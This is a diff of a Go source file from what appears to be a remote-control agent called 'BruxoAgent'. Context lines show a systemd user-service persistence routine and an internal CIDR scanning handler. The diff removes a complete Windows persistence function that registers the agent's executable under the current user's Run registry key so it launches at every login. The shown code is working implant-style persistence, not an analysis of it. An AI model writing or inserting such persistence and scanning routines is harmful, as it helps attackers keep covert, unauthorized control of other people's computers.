@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -12,10 +13,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
-	"net"
 	"time"
-
-	"golang.org/x/sys/windows/registry"
 )
 
 var (
@@ -235,25 +233,6 @@ WantedBy=default.target
 	}
 
 	return "Persistence established successfully via systemd user service."
-}
-
-func persistWindows() string {
-	exePath, err := os.Executable()
-	if err != nil {
-		return "Error getting executable path: " + err.Error()
-	}
-
-	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
-	if err != nil {
-		return "Error opening registry key: " + err.Error()
-	}
-	defer key.Close()
-
-	if err := key.SetStringValue("BruxoAgent", exePath); err != nil {
-		return "Error setting registry value: " + err.Error()
-	}
-
-	return "Persistence established successfully via Windows Registry."
 }
 
 func handleInternalScan(cidr string) string {
